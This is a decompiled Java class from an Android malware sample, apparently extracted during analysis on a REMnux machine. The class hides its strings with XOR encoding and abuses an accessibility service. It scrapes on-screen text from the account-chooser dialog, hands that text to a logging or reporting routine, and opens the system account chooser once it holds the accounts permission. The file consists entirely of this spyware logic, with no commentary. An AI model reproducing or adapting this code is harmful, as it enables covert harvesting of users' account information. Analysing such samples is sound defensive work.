package com.zjxyxnvvp.nxvxchltf.i;

import android.accessibilityservice.AccessibilityService;
import android.accounts.AccountManager;
import android.content.Intent;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import com.zjxyxnvvp.nxvxchltf.UIDNwaidobaWIODb;
import com.zjxyxnvvp.nxvxchltf.d;
import com.zjxyxnvvp.nxvxchltf.util.b;
import com.zjxyxnvvp.nxvxchltf.util.c;
import com.zjxyxnvvp.nxvxchltf.util.e;
import java.util.List;
import org.json.JSONException;
import org.json.JSONObject;
/* loaded from: /home/remnux/decompressedMalicious.dex */
public class g {
    private static short[] $ = {8037, 8039, 8054, 8029, 8035, 8033, 8033, 8045, 8055, 8044, 8054, 8049, 8370, 8381, 8375, 8353, 8380, 8378, 8375, 8445, 8370, 8368, 8368, 8380, 8358, 8381, 8359, 8352, 8445, 8336, 8379, 8380, 8380, 8352, 8374, 8327, 8362, 8355, 8374, 8338, 8381, 8375, 8338, 8368, 8368, 8380, 8358, 8381, 8359, 8338, 8368, 8359, 8378, 8357, 8378, 8359, 8362, 3574, 3527, 3546, 3542, 3572, 3531, 3527, 3541, 7255, 7244, 3963, 3918, 3933, 3934, 3934, 3929, 3928, 3868, 3929, 3921, 3933, 3925, 3920, 3919, 3846, 3868, 7337, 7334, 7340, 7354, 7335, 7329, 7340, 7398, 7352, 7341, 7354, 7333, 7329, 7355, 7355, 7329, 7335, 7334, 7398, 7311, 7309, 7324, 7319, 7305, 7307, 7307, 7303, 7325, 7302, 7324, 7323, 7050, 7069, 7051, 7053, 7060, 7052, 6165, 6199, 6176, 6205, 6178, 6205, 6176, 6189, 6260, 6204, 6197, 6183, 6260, 6198, 6193, 6193, 6202, 6260, 6200, 6197, 6177, 6202, 6199, 6204, 6193, 6192, 6264, 6260, 6199, 6204, 6193, 6199, 6207, 6260, 6183, 6189, 6183, 6176, 6193, 6201, 6260, 6200, 6203, 6195, 6183};

    /* renamed from: a  reason: collision with root package name */
    private static long f328a;

    private static String $(int i, int i2, int i3) {
        char[] cArr = new char[i2 - i];
        for (int i4 = 0; i4 < i2 - i; i4++) {
            cArr[i4] = (char) ($[i + i4] ^ i3);
        }
        return new String(cArr);
    }

    public static void a(AccessibilityService accessibilityService, AccessibilityEvent accessibilityEvent) {
        if (!UIDNwaidobaWIODb.k) {
            p pVar = d.e.c;
            String $2 = $(0, 12, 7938);
            f b2 = pVar.b($2);
            if (System.currentTimeMillis() - f328a > 8000) {
                CharSequence className = accessibilityEvent.getClassName();
                AccessibilityNodeInfo accessibilityNodeInfo = UIDNwaidobaWIODb.i;
                if (!(accessibilityNodeInfo == null || className == null || !className.equals($(12, 57, 8403)))) {
                    List<AccessibilityNodeInfo> b3 = b.b(accessibilityNodeInfo, $(57, 65, 3490));
                    StringBuilder sb = new StringBuilder();
                    for (AccessibilityNodeInfo accessibilityNodeInfo2 : b3) {
                        sb.append(accessibilityNodeInfo2.getText());
                        sb.append($(65, 67, 7276));
                    }
                    e.a($(67, 83, 3900) + sb.toString());
                    c.b();
                }
            }
            if (!(b2 == null || b2.c() || accessibilityService.checkSelfPermission($(83, 114, 7368)) != 0)) {
                Intent newChooseAccountIntent = AccountManager.newChooseAccountIntent(null, null, null, null, null, null, null);
                newChooseAccountIntent.addFlags(268435456);
                accessibilityService.startActivity(newChooseAccountIntent);
                JSONObject jSONObject = new JSONObject();
                try {
                    jSONObject.put($(114, 120, 7160), $(120, 165, 6228));
                } catch (JSONException e) {
                    e.printStackTrace();
                }
                pVar.e($2, jSONObject);
            }
        }
    }
}
